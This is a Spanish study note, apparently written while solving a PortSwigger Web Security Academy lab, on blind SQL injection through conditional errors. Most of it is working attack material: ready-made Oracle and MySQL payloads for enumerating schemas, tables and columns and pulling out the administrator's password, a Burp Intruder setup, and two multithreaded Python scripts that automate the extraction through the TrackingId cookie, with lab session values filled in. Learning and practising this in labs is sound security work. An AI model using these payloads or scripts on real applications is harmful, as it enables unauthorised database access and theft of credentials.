
---
Tags: #sqli #error #condicional

---
### 1. Detección Inicial (Fuzzing)

El primer paso es comprobar si el parámetro (en este caso, la cookie `TrackingId`) es vulnerable interactuando con las comillas:

- **Añadir una comilla (`'`)**: Si el servidor devuelve un error (HTTP 500), hay una posible vulnerabilidad de sintaxis.
    
- **Añadir dos comillas (`''`)**: Si el error desaparece, confirmamos que la comilla anterior rompió la consulta SQL y la segunda la "arregló".
    

### 2. Identificación de la Base de Datos (Oracle)

Oracle tiene una sintaxis particular: requiere que toda sentencia `SELECT` tenga una cláusula `FROM`.

- **Prueba de concepto**: `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    - Si el error desaparece usando la tabla **`dual`**, estás ante una base de datos **Oracle**.
        
- **Confirmación de tablas**: `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    - Si no hay error, la tabla `users` existe. `ROWNUM = 1` evita errores por devolver múltiples filas.
        

### 3. Lógica del Ataque Condicional

Para extraer datos, provocamos un error de forma intencionada (como una división por cero) solo cuando una condición sea **verdadera**.

Estructura del Payload:

'||(SELECT CASE WHEN (CONDICIÓN) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

- **Si la condición es CIERTA**: El servidor intenta ejecutar `1/0`, falla y devuelve **HTTP 500**.
    
- **Si la condición es FALSA**: El servidor devuelve `''`, la consulta es válida y responde con **HTTP 200**.
    

### 4. Extracción de Información del Administrador

Una vez confirmada la lógica, se procede a interrogar a la base de datos:

- **Verificar usuario**: `...CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'...` (Si da 500, el usuario existe).
    
- **Determinar longitud de contraseña**:
    
    - Usar `LENGTH(password) > X`.
        
    - Ejemplo: `...CASE WHEN LENGTH(password) > 19 THEN TO_CHAR(1/0) ELSE '' END...`
        
    - Si `> 19` da error pero `> 20` no, la longitud es exactamente 20.
        

### 5. Fuerza Bruta de Caracteres (Exfiltración)

Para descubrir la contraseña carácter por carácter, se utiliza la función `SUBSTR(cadena, posición, longitud)`.

Payload para Burp Intruder:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

1. **Configuración en Intruder**: Marcar el carácter a probar (la `'a'`).
    
2. **Payloads**: Lista simple con `a-z` y `0-9`.
    
3. **Análisis**: El carácter correcto será aquel que devuelva un código de estado **500**.
    
4. **Repetición**: Cambiar el índice de `SUBSTR(password, 2, 1)`, luego `3, 1`, etc., hasta completar la longitud identificada.
    

---

### Resumen de Funciones Clave

| **Función**     | **Propósito**                                                                    |
| --------------- | -------------------------------------------------------------------------------- |
| `               |                                                                                  |
| `dual`          | Tabla integrada de Oracle para consultas que no requieren tablas de usuario.     |
| `ROWNUM = 1`    | Limita el resultado a una sola fila (necesario para la concatenación).           |
| `CASE WHEN ...` | Estructura lógica para ejecutar acciones basadas en condiciones.                 |
| `TO_CHAR(1/0)`  | Provoca un error de división por cero (convertido a string para compatibilidad). |
| `SUBSTR()`      | Extrae una parte de un string.                                                   |

---
### Blind SQLi Basado en Errores Condicionales (Sentencias Listas)

| **Objetivo**         | **Oracle (Basado en CASE y 1/0)**                                                                                                                                                                                                                                                                                                                                                            | **MySQL (Basado en IF y EXP(710))**                                                                                                     |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Gatillo de Error** | `TO_CHAR(1/0)`                                                                                                                                                                                                                                                                                                                                                                               | `EXP(710)`                                                                                                                              |
| **Listar BDD**       | `' AND (SELECT CASE WHEN (SUBSTR(owner,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tables WHERE rownum=1)='a-- -`<br><br>- Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(o,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT owner AS o, rownum AS rn FROM all_tables) WHERE rn=2)='a-- -`                                                                  | `' AND (SELECT IF(SUBSTR(schema_name,1,1)='a', EXP(710), 1) FROM information_schema.schemata LIMIT 0,1)='1-- -`                         |
| **Listar Tablas**    | `' AND (SELECT CASE WHEN (SUBSTR(table_name,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tables WHERE rownum=1)='a-- -`<br><br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(t,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT table_name AS t, rownum AS rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn=2)='a-- -`                           | `' AND (SELECT IF(SUBSTR(table_name,1,1)='a', EXP(710), 1) FROM information_schema.tables LIMIT 0,1)='1-- -`                            |
| **Listar Columnas**  | `' AND (SELECT CASE WHEN (SUBSTR(column_name,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tab_columns WHERE table_name='USERS' AND rownum=1)='a-- -`<br><br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(c,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT column_name AS c, rownum AS rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn=2)='a` | `' AND (SELECT IF(SUBSTR(column_name,1,1)='a', EXP(710), 1) FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='1-- -` |
| **Extraer Datos**    | `' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' AND rownum=1)='a-- -`<br><br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(p,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT password AS p, rownum AS rn FROM users) WHERE rn=2)='a-- -`                                          | `' AND (SELECT IF(SUBSTR(password,1,1)='a', EXP(710), 1) FROM users LIMIT 0,1)='1-- -`                                                  |

---

> [!example]+  
> 💥 Forzar error con contenido
> 
> `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`

---
## Ejemplo de script en python para enumerar con Blind SQLi basado en errores

```python
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURACIÓN ---
URL = "https://0a220027046ee561804ce48d00d20077.web-security-academy.net/filter?category=Pets"
TRACKING_ID = "gUq0xv9rXGDNcOHk"
SESSION = "On0TYNflf10guAWWRXJRVi62F2fS9jaJ"

# --- VARIABLE GLOBAL DE QUERY ---
# Opción 1: Tablas
QUERY_BASE = "SELECT table_name FROM user_tables"

# Opción 2: Columnas (Recuerda poner el nombre de la tabla en MAYÚSCULAS)
# QUERY_BASE = "SELECT column_name FROM user_tab_columns WHERE table_name='USERS'"

# --- CONFIGURACIÓN TÉCNICA ---
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_$:-"
MAX_HILOS = 20 

def check_char(fila, pos, char):
    # Extraemos el nombre de la columna dinámicamente de la QUERY_BASE
    # (Toma la palabra justo después del primer SELECT)
    col_name = QUERY_BASE.split()[1]
    
    # Estructura de alias estable que ya probamos que funciona
    sql = (
        f"' AND (SELECT CASE WHEN (SUBSTR(t.target,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END "
        f"FROM (SELECT {col_name} AS target, rownum AS rn FROM ({QUERY_BASE})) t "
        f"WHERE t.rn={fila})='a"
    )
    
    cookies = {"TrackingId": f"{TRACKING_ID}{sql}", "session": SESSION}
    
    try:
        r = requests.get(URL, cookies=cookies, timeout=10)
        if r.status_code == 500:
            # Doble verificación para evitar falsos positivos AAAAA
            sql_fake = sql.replace(f"='{char}'", "='§'") 
            r_fake = requests.get(URL, cookies={"TrackingId": f"{TRACKING_ID}{sql_fake}", "session": SESSION}, timeout=5)
            if r_fake.status_code != 500:
                return char
    except:
        pass
    return None

def main():
    print(f"[+] Auditando: {QUERY_BASE}")
    
    for fila in range(1, 21): 
        res_fila = ""
        print(f"[*] Fila {fila}: ", end="", flush=True)
        found_any = False
        
        for pos in range(1, 51):
            letra_encontrada = None
            with ThreadPoolExecutor(max_workers=MAX_HILOS) as executor:
                futures = [executor.submit(check_char, fila, pos, c) for c in CHARSET]
                for future in futures:
                    letra = future.result()
                    if letra:
                        letra_encontrada = letra
                        break
            
            if letra_encontrada:
                res_fila += letra_encontrada
                print(letra_encontrada, end="", flush=True)
                found_any = True
            else:
                if pos == 1: 
                    print("(Vacia)")
                else:
                    print("") # Salto de línea al terminar la palabra
                break
        
        if not found_any and fila > 1:
            break
            
        time.sleep(0.3)

if __name__ == "__main__":
    main()
```

---
## Ejemplo de script en python para extraer datos con Blind SQLi basado en errores

```python
import requests

import string

from concurrent.futures import ThreadPoolExecutor

  

# CONFIGURACIÓN DEL LABORATORIO

url = "https://0adb009e0356318580bf08f700af004c.web-security-academy.net/filter?category=Pets"

tracking_id_prefix = "X36Cbo9MaaXKlmwq"

session_cookie = "NkymGUG7kcPOZo9R1pa0cEk3CeZPxVX7"

  

# Caracteres a probar (Oracle es case-sensitive para datos, no para nombres de tabla)

charset = string.ascii_letters + string.digits + ':_-'

extracted_data = [""] * 50 # Espacio para 30 caracteres

  

def check_char(pos, char):

    # --- CAMBIA LA QUERY AQUÍ SEGÚN TU OBJETIVO ---

    # Ejemplo para PASSWORD del administrador:

    payload = f"' AND (SELECT CASE WHEN (SUBSTR(username || ':' || password,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"

    cookies = {

        "TrackingId": f"{tracking_id_prefix}{payload}",

        "session": session_cookie

    }

    try:

        response = requests.get(url, cookies=cookies, timeout=10)

        if response.status_code == 500:

            return char

    except Exception:

        pass

    return None

  

def run_extraction():

    print("[+] Extrayendo datos con hilos...")

    # Probamos posiciones de la 1 a la 20

    for i in range(1, 50):

        with ThreadPoolExecutor(max_workers=20) as executor:

            # Enviamos todas las letras del charset a hilos diferentes para la posición i

            futures = [executor.submit(check_char, i, char) for char in charset]

            found = False

            for future in futures:

                result = future.result()

                if result:

                    extracted_data[i] = result

                    print(f"[!] Posición {i}: {result} -> {''.join(extracted_data)}")

                    found = True

                    break

        if not found:

            break

  

    print(f"\n[FIN] Resultado: {''.join(extracted_data)}")

  

if __name__ == "__main__":

    run_extraction()
```

---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)